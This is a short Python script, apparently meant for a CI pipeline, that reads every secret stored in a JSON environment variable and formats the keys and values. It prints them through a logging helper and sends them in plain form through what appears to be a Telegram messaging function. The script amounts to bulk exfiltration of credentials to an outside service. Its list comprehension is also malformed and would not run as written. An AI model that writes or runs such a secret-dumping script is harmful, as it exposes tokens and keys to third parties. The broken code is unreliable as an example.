import os
import json
from pytools.pytools import tgsend
from pytools.pytools import secretlog

secrets=json.loads(os.environ['secrets'])
msg='\n'.join([f'{key}: `{value}`' for key,value in secrets.items() if not '\n' in value else f'{key}: ```\n{value}\n```'])
print(secretlog(msg))
tgsend(msg)
